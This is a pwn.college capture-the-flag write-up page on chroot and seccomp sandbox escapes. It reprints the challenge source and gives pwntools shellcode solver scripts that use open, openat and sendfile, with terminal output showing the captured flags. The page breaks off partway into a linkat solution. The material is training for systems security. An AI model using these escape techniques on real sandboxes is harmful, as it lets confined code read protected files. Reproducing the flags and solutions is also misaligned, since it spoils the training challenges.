---
custom_edit_url: null
sidebar_position: 1
slug: /pwn-college/system-security/sandboxing
---

## chroot-escape-basic

> Escape a basic chroot sandbox!

```c title="/challenge/babyjail_level1.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");
    puts("The only thing you can do in this challenge is read out one single file, as specified by the first argument to the");
    puts("program (argv[1]).\n");

    assert(argc > 1);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    printf("Sending the file at `%s` to stdout.\n", argv[1]);
    sendfile(1, open(argv[1], 0), 0, 128);

}
```

Let us try passing `/flag` as the argument.

```
hacker@sandboxing~chroot-escape-basic:~$ /challenge/babyjail_level1 /flag
###
### Welcome to /challenge/babyjail_level1!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
program (argv[1]).

Creating a jail at `/tmp/jail-kDl2Ox`.
Sending the file at `/flag` to stdout.
FLAG{FAKE}
```

So the `chroot` operation has been performed successfully.
However, notice that even though the jail has been set, the program did not change directory to `/` and put us in that jail.

So the current working directory is still `/home/hacker`.
If we give it `/flag` as `argv[1]`, it is interpreted as `/tmp/jail/flag`, which gives us the fake flag.

In order to get the real flag, we have to pass the relative address of the real `/flag` from `/tmp/jail/`.

```
hacker@sandboxing~chroot-escape-basic:~$ /challenge/babyjail_level1 ../../flag
###
### Welcome to /challenge/babyjail_level1!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

The only thing you can do in this challenge is read out one single file, as specified by the first argument to the
program (argv[1]).

Creating a jail at `/tmp/jail-DGE7N1`.
Sending the file at `../../flag` to stdout.
pwn.college{AO2x7w9KBL15qsbaBR_F1iN4tu0.0VMzIDL4ITM0EzW}
```

&nbsp;

## chroot-shellcode

> Escape a basic chroot sandbox by utilizing shellcode.

```c title="/challenge/babyjail_level2.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
}
```

In this challenge, the directory still has not been changed. 
However, we cannot pass an argument containing `flag`.

Let's create a script which will read the the flag and print it out for us.

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* open("../../flag", 0, 0) */
    lea rdi, [rip + flag]
    xor esi, esi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* sendfile(1, rax, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "../../flag"
"""

# Start challenge
p = process(["/challenge/babyjail_level2", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode directly (no overflow needed)
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~chroot-shellcode:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level2!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-BcrKbg`.
Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 8d 3d 37 00 00 00                          | lea rdi, [rip + 0x37]
0x0000000001337007 | 31 f6                                         | xor esi, esi
0x0000000001337009 | 48 31 d2                                      | xor rdx, rdx
0x000000000133700c | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x0000000001337013 | 0f 05                                         | syscall 
0x0000000001337015 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x000000000133701c | 48 89 c6                                      | mov rsi, rax
0x000000000133701f | 48 31 d2                                      | xor rdx, rdx
0x0000000001337022 | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337029 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337030 | 0f 05                                         | syscall 
0x0000000001337032 | 48 31 ff                                      | xor rdi, rdi
0x0000000001337035 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x000000000133703c | 0f 05                                         | syscall 

Executing shellcode!

pwn.college{oZXlTLdkIAGmCbUu1FXFBPnZ74J.0lMzIDL4ITM0EzW}
$  
```

&nbsp;

## chroot-proper

> Escape a chroot sandbox with shellcode.

```c title="/challenge/babyjail_level3.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    puts("Executing shellcode!\n");

    ((void(*)())shellcode)();
}
```

In this challenge, the directory has been changed.

```c title="/challenge/babyjail_level3.c" showLineNumbers
# ---- snip ----

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

# ---- snip ----
```

That means we cannot just `../../flag` our way to getting the flag.

### `openat` syscall

Fortunately, there is `openat` syscall in linux which takes a directory file descriptor and the path of the file to be opened relative to the directory as input.

```c
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
```

In our case, the `dirfd` will be 3, the first three being STDIN, STDERR and STDOUT.

The `openat` syscall would look something like this:

```
# Openat syscall
mov rdi, 3
lea rsi, [rip + flag]
mov rdx, 0
mov r10, 0
mov rax, 0x101
syscall

flag:
.string "flag"
```

Note that I specified `flag` and not `/flag` because that would reference the file inside `jail/`.

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* openat(3, "flag", O_RDONLY, 0) */
    mov rdi, 3              /* dirfd */
    lea rsi, [rip + flag]   /* pathname */
    xor rdx, rdx            /* flags = O_RDONLY */
    xor r10, r10            /* mode = 0 */
    mov rax, 257            /* syscall: openat */
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "flag"
"""

# Start challenge (argv[1] can be anything without "flag")
p = process(["/challenge/babyjail_level3", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~chroot-proper:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level3!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-aaL725`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 38 00 00 00                          | lea rsi, [rip + 0x38]
0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
0x0000000001337011 | 4d 31 d2                                      | xor r10, r10
0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
0x000000000133701b | 0f 05                                         | syscall 
0x000000000133701d | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337024 | 48 89 c6                                      | mov rsi, rax
0x0000000001337027 | 48 31 d2                                      | xor rdx, rdx
0x000000000133702a | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337031 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337038 | 0f 05                                         | syscall 
0x000000000133703a | 48 31 ff                                      | xor rdi, rdi
0x000000000133703d | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337044 | 0f 05                                         | syscall 
0x0000000001337046 | 66 6c                                         | insb byte ptr [rdi], dx

Executing shellcode!

pwn.college{gvFAN1z3CXTZzC9qSl8LgpbsVnQ.01MzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-basic

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level4.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "openat", SCMP_SYS(openat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

Since we can use the following syscalls: `openat`, `read`, `write`, `sendfile`, we can just use the slver script from the previous challenge.

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* openat(3, "flag", O_RDONLY, 0) */
    mov rdi, 3              /* dirfd */
    lea rsi, [rip + flag]   /* pathname */
    xor rdx, rdx            /* flags = O_RDONLY */
    xor r10, r10            /* mode = 0 */
    mov rax, 257            /* syscall: openat */
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "../../flag"
"""

# Start challenge (argv[1] can be anything without "flag")
p = process(["/challenge/babyjail_level4", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~seccomp-basic:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level4!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-1uJXSg`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 38 00 00 00                          | lea rsi, [rip + 0x38]
0x000000000133700e | 48 31 d2                                      | xor rdx, rdx
0x0000000001337011 | 4d 31 d2                                      | xor r10, r10
0x0000000001337014 | 48 c7 c0 01 01 00 00                          | mov rax, 0x101
0x000000000133701b | 0f 05                                         | syscall 
0x000000000133701d | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337024 | 48 89 c6                                      | mov rsi, rax
0x0000000001337027 | 48 31 d2                                      | xor rdx, rdx
0x000000000133702a | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337031 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337038 | 0f 05                                         | syscall 
0x000000000133703a | 48 31 ff                                      | xor rdi, rdi
0x000000000133703d | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337044 | 0f 05                                         | syscall 

Restricting system calls (default: kill).

Allowing syscall: openat (number 257).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{QUVii7Ps7OxJqCFzhctTv3dgsIP.0FNzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-linkat

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["linkat", "open", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level5.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "linkat", SCMP_SYS(linkat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This challenge opens the file / directory that we pass as an argument.

```c title="/challenge/babyjail_level5.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

We can no longer use `openat`, but now we are allowed to use `linkat`.


### `linkat` syscall

It takes five arguments.

```c
int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
```

Using `linkat` we can create a [hard link](https://en.wikipedia.org/wiki/Hard_link) in `/tmp/jail/` that points to the `/flag` file in `/` directory.
A hard link is an entry that associates a name with a file.
This allows us to access `/flag` inside of `/tmp/jail/` using a different name.

We can pass `olddrifd` to `3`, as it was the last file descriptor which was opened. As for `newdirfd`, we can set it to `AT_FDCWD` so that it ignores the the file descriptor, and uses the current working directory.

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* linkat(3, "flag", AT_FDCWD, "/flag2", 0) */
